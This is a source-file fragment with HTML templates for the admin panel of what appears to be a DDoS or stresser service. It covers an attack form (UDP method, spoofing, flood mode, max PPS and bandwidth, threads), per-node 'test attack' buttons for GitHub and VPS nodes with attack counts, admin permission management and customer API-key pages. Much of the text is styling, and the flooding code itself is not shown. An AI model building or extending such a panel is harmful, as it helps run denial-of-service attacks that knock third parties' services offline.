                <option value="default">Default</option><option value="max-pps">Max PPS</option><option value="max-bandwidth">Max BW</option><option value="both">Both</option>
            </select>
        </div>
        <div class="col-md-2"><label>Threads</label><input type="number" name="threads" class="form-control bg-dark text-white" value="500"></div>
        <div class="col-md-2 d-flex align-items-end">
            <div><label class="form-check-label me-2"><input type="checkbox" name="random_ports" value="1"> RandPorts</label></div>
            <div><label class="form-check-label me-2"><input type="checkbox" name="spoof" value="1"> Spoof</label></div>
            <div><label class="form-check-label"><input type="checkbox" name="flood" value="1"> Flood</label></div>
        </div>
        <div class="col-md-2"><label>PPS Limit</label><input type="number" name="pps_limit" class="form-control bg-dark text-white" value="0"></div>
        <div class="col-md-1 d-flex align-items-end"><button type="submit" class="btn-neon w-100"><i class="fas fa-play"></i> Test All</button></div>
    </div>
</form>
</div>

<!-- Individual Node Testing -->
<div class="glass-card"><h4><i class="fas fa-server me-2"></i>Test Individual Nodes</h4>
<div id="nodeListContainer"><div class="text-center text-muted">Loading nodes...</div></div>
</div>

<!-- Results Panel -->
{% if results %}
<div class="glass-card fade-in"><h4><i class="fas fa-clipboard-list me-2"></i>Test Results</h4>
<p><strong>Target:</strong> {{ target }}:{{ port }} | <strong>Duration:</strong> {{ duration }}s | <strong>Method:</strong> {{ method }} | <strong>Mode:</strong> {{ mode }} | <strong>Threads:</strong> {{ threads }}</p>
<div class="table-responsive"><table class="table table-dark table-hover">
    <thead><tr><th>Node</th><th>Type</th><th>Status</th><th>Details</th></tr></thead>
    <tbody>{% for r in results %}<tr><td>{{ r.name }}</td><td>{{ r.type }}</td><td><span class="status-badge {% if 'Success' in r.status %}status-success{% else %}status-failed{% endif %}">{{ r.status }}</span></td><td><small>{{ r.details or '' }}</small></td></tr>{% endfor %}</tbody>
</table></div>
<div class="alert alert-info mt-3"><strong>Summary:</strong> GitHub: {{ github_success }}/{{ github_total }} | VPS: {{ vps_success }}/{{ vps_total }}</div>
</div>
{% endif %}
</div>

<script>
async function loadNodes() {
    try {
        const res = await fetch('/admin/nodes/status/all');
        const nodes = await res.json();
        const container = document.getElementById('nodeListContainer');
        if (nodes.length === 0) {
            container.innerHTML = '<div class="text-muted">No nodes available.</div>';
            return;
        }
        let html = '<div class="row g-3">';
        nodes.forEach(node => {
            const statusColor = node.status === 'active' ? 'status-success' : (node.status === 'no_binary' ? 'status-running' : 'status-failed');
            html += `<div class="col-md-4"><div class="bg-dark p-3 rounded-3">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <strong>${node.name}</strong><span class="status-badge ${statusColor}">${node.status}</span>
                </div>
                <p class="small mb-2"><i class="fas fa-${node.type === 'github' ? 'code-branch' : 'server'}"></i> ${node.type.toUpperCase()} | Attacks: ${node.attack_count}</p>
                <button class="btn btn-sm btn-outline-info w-100" onclick="testSingleNode('${node.id}', '${node.name}')"><i class="fas fa-flask"></i> Test This Node</button>
            </div></div>`;
        });
        html += '</div>';
        container.innerHTML = html;
    } catch(e) { console.error(e); }
}

async function testSingleNode(nodeId, nodeName) {
    if (!confirm(`Test attack on ${nodeName}? Use default test target (127.0.0.1:443, 5s, UDP).`)) return;
    const btn = event.target;
    const originalText = btn.innerHTML;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Testing...';
    btn.disabled = true;
    try {
        const formData = new FormData();
        formData.append('target', '127.0.0.1');
        formData.append('port', '443');
        formData.append('duration', '5');
        formData.append('method', 'udp');
        formData.append('mode', 'default');
        formData.append('threads', '500');
        formData.append('single_node', nodeId);
        const res = await fetch('/admin/test-attack/single', { method: 'POST', body: formData });
        const data = await res.json();
        alert(`Test on ${nodeName}: ${data.status} - ${data.message}`);
    } catch(e) {
        alert('Test failed');
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

document.addEventListener('DOMContentLoaded', loadNodes);
</script>
</body></html>
'''

ADMIN_MANAGE_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Manage Admins • Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.75);
  --surface2: rgba(10, 4, 18, 0.6);
  --border: rgba(255, 40, 100, 0.18);
  --border2: rgba(255,255,255,0.06);
  --accent: #ff3366;
  --accent2: #ff6680;
  --green: #00ffaa;
  --blue: #00aaff;
  --yellow: #ffcc00;
  --purple: #aa66ff;
  --text: #f0d0d8;
  --muted: rgba(220,170,185,0.45);
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 28px 20px;
  position: relative;
  overflow-x: hidden;
}

.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(255,40,100,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.025) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.14; pointer-events: none; z-index: 0;
  animation: drift linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -150px; animation-duration: 22s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#6600ff, transparent 70%); bottom: -100px; left: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-30px,20px) scale(1.05); }
  66%  { transform: translate(20px,-15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

.container { position: relative; z-index: 10; max-width: 1200px; margin: 0 auto; }

/* Topbar */
.topbar {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 32px; flex-wrap: wrap; gap: 12px;
  animation: fadeDown 0.5s ease both;
}
@keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:translateY(0); } }

.back-btn {
  display: inline-flex; align-items: center; gap: 8px;
  color: var(--muted); text-decoration: none; font-size: 13px;
  font-weight: 600; letter-spacing: 1px; text-transform: uppercase;
  border: 1px solid var(--border2); border-radius: 10px; padding: 8px 16px;
  transition: all 0.2s;
}
.back-btn:hover { color: var(--accent2); border-color: var(--border); background: rgba(255,40,100,0.05); }

.page-title {
  font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}

.admin-badge {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 14px;
  font-size: 11px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--accent2);
}
.badge-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 1.4s ease-in-out infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Section title */
.section-title {
  font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 700;
  letter-spacing: 2px; text-transform: uppercase; color: var(--muted);
  margin-bottom: 16px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Panel */
.panel {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border); border-radius: var(--radius);
  overflow: hidden; margin-bottom: 24px;
}
.panel-header {
  padding: 14px 22px; background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; color: var(--accent2);
  display: flex; align-items: center; gap: 8px;
}
.panel-body { padding: 24px; }

/* Form grid */
.create-grid {
  display: grid; grid-template-columns: 1fr 1fr auto; gap: 16px;
  align-items: end; margin-bottom: 20px;
}

.field { }
.field label {
  display: block; font-size: 11px; font-weight: 700;
  letter-spacing: 1px; text-transform: uppercase;
  color: var(--muted); margin-bottom: 7px;
}
.form-input, .form-select {
  width: 100%; background: rgba(0,0,0,0.45);
  border: 1px solid rgba(255,255,255,0.07); border-radius: 10px;
  padding: 11px 16px; color: var(--text);
  font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 500;
  outline: none; transition: all 0.2s; -webkit-appearance: none;
}
.form-input::placeholder { color: rgba(220,170,185,0.25); }
.form-input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(255,40,100,0.1);
  background: rgba(255,40,100,0.03);
}

/* Permissions grid */
.perms-label {
  font-size: 11px; font-weight: 700; letter-spacing: 1px;
  text-transform: uppercase; color: var(--muted); margin-bottom: 12px;
  display: flex; align-items: center; gap: 8px;
}
.perms-grid {
  display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
  margin-bottom: 16px;
}
.perm-item {
  display: flex; align-items: center; gap: 10px;
  background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.06);
  border-radius: 10px; padding: 10px 14px; cursor: pointer;
  transition: all 0.2s; user-select: none;
}
.perm-item:hover { border-color: rgba(255,40,100,0.25); background: rgba(255,40,100,0.05); }
.perm-item input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--accent); cursor: pointer; flex-shrink: 0; }
.perm-item label { font-size: 13px; font-weight: 600; color: var(--muted); cursor: pointer; transition: color 0.2s; }
.perm-item:has(input:checked) { border-color: rgba(255,40,100,0.35); background: rgba(255,40,100,0.08); }
.perm-item:has(input:checked) label { color: var(--accent2); }

/* Super admin row */
.super-row {
  display: flex; align-items: center; gap: 12px;
  background: rgba(255,200,0,0.05); border: 1px solid rgba(255,200,0,0.15);
  border-radius: 10px; padding: 12px 16px; margin-bottom: 16px;
}
.super-row input[type="checkbox"] { width: 18px; height: 18px; accent-color: var(--yellow); cursor: pointer; }
.super-row label { font-size: 14px; font-weight: 600; color: var(--yellow); cursor: pointer; }
.super-note { font-size: 12px; color: var(--muted); margin-left: auto; }

/* Buttons */
.btn {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 11px 22px; border: none; border-radius: 10px;
  font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer;
  transition: all 0.22s ease; white-space: nowrap; text-decoration: none;
}
.btn-create {
  background: linear-gradient(135deg, var(--accent), #cc2255);
  color: #fff; box-shadow: 0 4px 16px rgba(255,40,100,0.25);
  padding: 11px 24px;
}
.btn-create:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,40,100,0.4); }

.btn-sm { padding: 6px 14px; font-size: 10px; border-radius: 8px; }
.btn-edit   { background: rgba(255,200,0,0.12); border: 1px solid rgba(255,200,0,0.25); color: var(--yellow); }
.btn-edit:hover { background: rgba(255,200,0,0.22); transform: translateY(-1px); }
.btn-del    { background: rgba(255,40,100,0.12); border: 1px solid rgba(255,40,100,0.25); color: var(--accent2); }
.btn-del:hover { background: rgba(255,40,100,0.22); transform: translateY(-1px); }
.btn-save   { background: linear-gradient(135deg, var(--accent), #cc2255); color: #fff; }
.btn-save:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,40,100,0.35); }

/* Table */
.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; }
thead tr { background: rgba(255,40,100,0.06); border-bottom: 1px solid var(--border); }
th {
  padding: 12px 16px; font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--muted); text-align: left; white-space: nowrap;
}
td {
  padding: 14px 16px; font-size: 14px; font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle;
}
tbody tr { transition: background 0.2s; }
tbody tr:hover { background: rgba(255,40,100,0.04); }
tbody tr:last-child td { border-bottom: none; }

/* Admin name */
.admin-name {
  display: flex; align-items: center; gap: 10px;
}
.admin-avatar {
  width: 32px; height: 32px; border-radius: 9px;
  background: linear-gradient(135deg, rgba(255,40,100,0.2), rgba(153,0,255,0.2));
  border: 1px solid rgba(255,40,100,0.25);
  display: flex; align-items: center; justify-content: center;
  font-size: 13px; font-weight: 700; color: var(--accent2);
  font-family: 'Orbitron', monospace;
  flex-shrink: 0;
}
.admin-uname { font-weight: 700; color: var(--text); }

/* Super badge */
.super-badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
}
.super-yes { background: rgba(255,200,0,0.1); border: 1px solid rgba(255,200,0,0.25); color: var(--yellow); }
.super-no  { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); color: var(--muted); }

/* Permission tags */
.perm-tags { display: flex; flex-wrap: wrap; gap: 5px; }
.perm-tag {
  padding: 2px 8px; border-radius: 5px; font-size: 11px; font-weight: 700;
  letter-spacing: 0.5px; text-transform: uppercase;
  background: rgba(0,170,255,0.1); border: 1px solid rgba(0,170,255,0.2); color: var(--blue);
}
.perm-tag-none { color: rgba(255,255,255,0.2); font-size: 13px; }

.action-group { display: flex; align-items: center; gap: 6px; }
.action-group form { display: inline; }

/* Modal overlay */
.modal-overlay {
  position: fixed; inset: 0; z-index: 100;
  background: rgba(0,0,0,0.7); backdrop-filter: blur(6px);
  display: flex; align-items: center; justify-content: center; padding: 20px;
  opacity: 0; pointer-events: none; transition: opacity 0.25s ease;
}
.modal-overlay.open { opacity: 1; pointer-events: all; }
.modal-box {
  background: var(--surface);
  border: 1px solid var(--border); border-radius: var(--radius);
  width: 100%; max-width: 540px; overflow: hidden;
  transform: translateY(20px) scale(0.97); transition: transform 0.25s ease;
}
.modal-overlay.open .modal-box { transform: translateY(0) scale(1); }
.modal-header {
  padding: 18px 24px; background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  display: flex; align-items: center; justify-content: space-between;
}
.modal-title { font-family: 'Orbitron', monospace; font-size: 14px; font-weight: 700; color: var(--accent2); }
.modal-close {
  background: none; border: none; color: var(--muted); font-size: 18px;
  cursor: pointer; padding: 0; line-height: 1; transition: color 0.2s;
}
.modal-close:hover { color: var(--accent); }
.modal-body { padding: 24px; }
.modal-footer { padding: 16px 24px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 10px; }

/* Empty state */
.empty-state { text-align: center; padding: 48px 20px; color: var(--muted); }
.empty-icon  { font-size: 40px; margin-bottom: 12px; opacity: 0.4; }

@media (max-width: 768px) {
  .create-grid { grid-template-columns: 1fr; }
  .perms-grid  { grid-template-columns: 1fr 1fr; }
  .topbar { flex-direction: column; align-items: flex-start; }
}
@media (max-width: 480px) {
  .perms-grid { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="container">

  <!-- Topbar -->
  <div class="topbar">
    <a href="/admin/dashboard" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    <h1 class="page-title">Manage Admins</h1>
    <div class="admin-badge"><div class="badge-dot"></div> Admin Panel</div>
  </div>

  <!-- Create Admin -->
  <div class="section-title"><i class="fas fa-user-plus"></i> Create New Admin</div>
  <div class="panel" style="animation: fadeUp 0.6s ease 0.1s both;">
    <div class="panel-header"><i class="fas fa-shield-alt"></i> New Administrator</div>
    <div class="panel-body">
      <form method="POST" action="/admin/manage/add">

        <div class="create-grid">
          <div class="field">
            <label>Username</label>
            <input type="text" name="username" class="form-input" placeholder="Enter username" required autocomplete="off">
          </div>
          <div class="field">
            <label>Password</label>
            <input type="password" name="password" class="form-input" placeholder="Enter password" required autocomplete="off">
          </div>
          <div class="field">
            <label>&nbsp;</label>
            <button type="submit" class="btn btn-create"><i class="fas fa-plus"></i> Create</button>
          </div>
        </div>

        <div class="super-row">
          <input type="checkbox" name="is_super" id="superCheck">
          <label for="superCheck">👑 Super Admin</label>
          <span class="super-note">Super admins inherit all permissions automatically</span>
        </div>

        <div class="perms-label"><i class="fas fa-lock"></i> Permissions</div>
        <div class="perms-grid">
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="dashboard" id="p_dashboard">
            <label for="p_dashboard"><i class="fas fa-tachometer-alt" style="margin-right:6px;opacity:0.6;"></i>Dashboard</label>
          </div>
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="nodes" id="p_nodes">
            <label for="p_nodes"><i class="fas fa-server" style="margin-right:6px;opacity:0.6;"></i>Nodes</label>
          </div>
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="keys" id="p_keys">
            <label for="p_keys"><i class="fas fa-key" style="margin-right:6px;opacity:0.6;"></i>Keys</label>
          </div>
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="settings" id="p_settings">
            <label for="p_settings"><i class="fas fa-cog" style="margin-right:6px;opacity:0.6;"></i>Settings</label>
          </div>
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="test_attack" id="p_test">
            <label for="p_test"><i class="fas fa-bolt" style="margin-right:6px;opacity:0.6;"></i>Test Attack</label>
          </div>
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="manage_admins" id="p_manage">
            <label for="p_manage"><i class="fas fa-user-shield" style="margin-right:6px;opacity:0.6;"></i>Manage Admins</label>
          </div>
        </div>

      </form>
    </div>
  </div>

  <!-- Admins Table -->
  <div class="section-title"><i class="fas fa-users-cog"></i> Existing Administrators</div>
  <div class="panel" style="animation: fadeUp 0.6s ease 0.2s both;">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Administrator</th>
            <th>Super Admin</th>
            <th>Permissions</th>
            <th>Created</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          {% for admin in admins %}
          <tr>
            <td>
              <div class="admin-name">
                <div class="admin-avatar">{{ admin.username[0]|upper }}</div>
                <span class="admin-uname">{{ admin.username }}</span>
              </div>
            </td>
            <td>
              {% if admin.is_super %}
                <span class="super-badge super-yes">👑 Super</span>
              {% else %}
                <span class="super-badge super-no">Standard</span>
              {% endif %}
            </td>
            <td>
              {% if admin.permissions %}
                <div class="perm-tags">
                  {% for p in admin.permissions %}
                    <span class="perm-tag">{{ p }}</span>
                  {% endfor %}
                </div>
              {% else %}
                <span class="perm-tag-none">—</span>
              {% endif %}
            </td>
            <td style="font-size:13px; color:var(--muted);">
              {{ admin.created_at.strftime('%Y-%m-%d') if admin.created_at else '—' }}
            </td>
            <td>
              <div class="action-group">
                <button class="btn btn-sm btn-edit" onclick="openModal('modal{{ loop.index }}')">
                  <i class="fas fa-pen"></i> Edit
                </button>
                <form method="POST" action="/admin/manage/delete/{{ admin._id if USE_MONGO else admin.id }}" onsubmit="return confirm('Delete admin {{ admin.username }}? This cannot be undone.')">
                  <button type="submit" class="btn btn-sm btn-del"><i class="fas fa-trash"></i> Delete</button>
                </form>
              </div>
            </td>
          </tr>
          {% else %}
          <tr>
            <td colspan="5">
              <div class="empty-state">
                <div class="empty-icon">👤</div>
                No administrators found.
              </div>
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

</div><!-- /container -->

<!-- Edit Modals -->
{% for admin in admins %}
<div class="modal-overlay" id="modal{{ loop.index }}">
  <div class="modal-box">
    <div class="modal-header">
      <div class="modal-title"><i class="fas fa-user-edit" style="margin-right:8px;"></i>Edit — {{ admin.username }}</div>
      <button class="modal-close" onclick="closeModal('modal{{ loop.index }}')">✕</button>
    </div>
    <form method="POST" action="/admin/manage/edit/{{ admin._id if USE_MONGO else admin.id }}">
      <div class="modal-body">

        <div class="super-row" style="margin-bottom:20px;">
          <input type="checkbox" name="is_super" id="es_{{ loop.index }}" {% if admin.is_super %}checked{% endif %}>
          <label for="es_{{ loop.index }}">👑 Super Admin</label>
          <span class="super-note">All permissions auto-granted</span>
        </div>

        <div class="perms-label"><i class="fas fa-lock"></i> Permissions</div>
        <div class="perms-grid">
          {% set all_perms = [('dashboard','Dashboard','tachometer-alt'), ('nodes','Nodes','server'), ('keys','Keys','key'), ('settings','Settings','cog'), ('test_attack','Test Attack','bolt'), ('manage_admins','Manage Admins','user-shield')] %}
          {% for val, label, icon in all_perms %}
          <div class="perm-item">
            <input type="checkbox" name="permissions" value="{{ val }}" id="ep_{{ loop.index }}_{{ val }}" {% if val in admin.permissions %}checked{% endif %}>
            <label for="ep_{{ loop.index }}_{{ val }}"><i class="fas fa-{{ icon }}" style="margin-right:6px;opacity:0.6;"></i>{{ label }}</label>
          </div>
          {% endfor %}
        </div>

      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-sm btn-del" onclick="closeModal('modal{{ loop.index }}')">Cancel</button>
        <button type="submit" class="btn btn-sm btn-save"><i class="fas fa-save"></i> Save Changes</button>
      </div>
    </form>
  </div>
</div>
{% endfor %}

<script>
function openModal(id) {
  document.getElementById(id).classList.add('open');
  document.body.style.overflow = 'hidden';
}
function closeModal(id) {
  document.getElementById(id).classList.remove('open');
  document.body.style.overflow = '';
}
// Close on overlay click
document.querySelectorAll('.modal-overlay').forEach(overlay => {
  overlay.addEventListener('click', e => {
    if (e.target === overlay) closeModal(overlay.id);
  });
});
// Close on Escape
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal-overlay.open').forEach(m => closeModal(m.id));
  }
});
</script>

<style>
@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
</style>
</body>
</html>
'''

ADMIN_API_KEYS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>API Keys • Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.75);
  --surface2: rgba(10, 4, 18, 0.6);
  --border: rgba(255, 40, 100, 0.18);
  --border2: rgba(255,255,255,0.06);
  --accent: #ff3366;
  --accent2: #ff6680;
  --green: #00ffaa;
  --blue: #00aaff;
  --yellow: #ffcc00;
  --purple: #aa66ff;
  --text: #f0d0d8;
  --muted: rgba(220,170,185,0.45);
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 28px 20px;
  position: relative;
  overflow-x: hidden;
}

.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(255,40,100,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.025) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.14; pointer-events: none; z-index: 0;
  animation: drift linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -150px; animation-duration: 22s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#6600ff, transparent 70%); bottom: -100px; left: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-30px,20px) scale(1.05); }
  66%  { transform: translate(20px,-15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

.container { position: relative; z-index: 10; max-width: 1280px; margin: 0 auto; }

/* Topbar */
.topbar {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 32px; flex-wrap: wrap; gap: 12px;
  animation: fadeDown 0.5s ease both;
}
@keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:translateY(0); } }

.back-btn {
  display: inline-flex; align-items: center; gap: 8px;
  color: var(--muted); text-decoration: none; font-size: 13px;
  font-weight: 600; letter-spacing: 1px; text-transform: uppercase;
  border: 1px solid var(--border2); border-radius: 10px; padding: 8px 16px;
  transition: all 0.2s;
}
.back-btn:hover { color: var(--accent2); border-color: var(--border); background: rgba(255,40,100,0.05); }

.page-title {
  font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}

.admin-badge {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 14px;
  font-size: 11px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--accent2);
}
.badge-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 1.4s ease-in-out infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Section title */
.section-title {
  font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 700;
  letter-spacing: 2px; text-transform: uppercase; color: var(--muted);
  margin-bottom: 16px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Stats row */
.stats-row {
  display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px;
  margin-bottom: 24px;
  animation: fadeUp 0.6s ease 0.15s both;
}
.stat-card {
  background: var(--surface);
  backdrop-filter: blur(18px);
  border: 1px solid var(--border);
  border-radius: 14px; padding: 18px 20px;
  display: flex; align-items: center; gap: 14px;
}
.stat-icon {
  width: 40px; height: 40px; border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-size: 16px; flex-shrink: 0;
}
.stat-icon.green { background: rgba(0,255,170,0.1); border: 1px solid rgba(0,255,170,0.2); color: var(--green); }
.stat-icon.blue  { background: rgba(0,170,255,0.1); border: 1px solid rgba(0,170,255,0.2); color: var(--blue); }
.stat-icon.red   { background: rgba(255,40,100,0.1); border: 1px solid rgba(255,40,100,0.2); color: var(--accent2); }
.stat-val { font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: var(--text); line-height: 1; }
.stat-label { font-size: 11px; font-weight: 600; letter-spacing: 0.5px; color: var(--muted); margin-top: 3px; text-transform: uppercase; }

/* Panel */
.panel {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border); border-radius: var(--radius);
  overflow: hidden; margin-bottom: 24px;
}
.panel-header {
  padding: 14px 20px; background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; color: var(--accent2);
  display: flex; align-items: center; gap: 8px;
}
.panel-body { padding: 24px; }

/* Form grid (generate key) */
.gen-grid {
  display: grid; grid-template-columns: 1fr 1fr 1fr 1fr;
  gap: 16px; align-items: end;
}
.field label {
  display: block; font-size: 11px; font-weight: 700;
  letter-spacing: 1px; text-transform: uppercase;
  color: var(--muted); margin-bottom: 7px;
}
.form-input, .form-select {
  width: 100%; background: rgba(0,0,0,0.45);
  border: 1px solid rgba(255,255,255,0.07); border-radius: 10px;
  padding: 11px 16px; color: var(--text);
  font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 500;
  outline: none; transition: all 0.2s; -webkit-appearance: none;
}
.form-select {
  cursor: pointer;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23ff6680' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
  background-repeat: no-repeat; background-position: right 14px center; padding-right: 36px;
}
.form-input::placeholder { color: rgba(220,170,185,0.25); }
.form-input:focus, .form-select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(255,40,100,0.1);
  background: rgba(255,40,100,0.03);
}
.form-select option { background: #1a0a14; color: var(--text); }

/* Custom limits row */
.custom-row {
  display: grid; grid-template-columns: repeat(3, 1fr);
  gap: 16px; margin-top: 16px;
}

/* Buttons */
.btn {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 11px 22px; border: none; border-radius: 10px;
  font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer;
  transition: all 0.22s ease; white-space: nowrap; text-decoration: none;
}
.btn-generate {
  background: linear-gradient(135deg, var(--accent), #cc2255);
  color: #fff; box-shadow: 0 4px 16px rgba(255,40,100,0.25);
  padding: 11px 22px;
}
.btn-generate:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,40,100,0.4); }

.btn-sm { padding: 6px 14px; font-size: 10px; border-radius: 8px; }
.btn-warning { background: rgba(255,200,0,0.12); border: 1px solid rgba(255,200,0,0.25); color: var(--yellow); }
.btn-warning:hover { background: rgba(255,200,0,0.22); transform: translateY(-1px); }
.btn-danger  { background: rgba(255,40,100,0.12); border: 1px solid rgba(255,40,100,0.3); color: var(--accent2); }
.btn-danger:hover { background: rgba(255,40,100,0.22); transform: translateY(-1px); }

/* Table */
.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; }
thead tr { background: rgba(255,40,100,0.06); border-bottom: 1px solid var(--border); }
th {
  padding: 12px 16px; font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
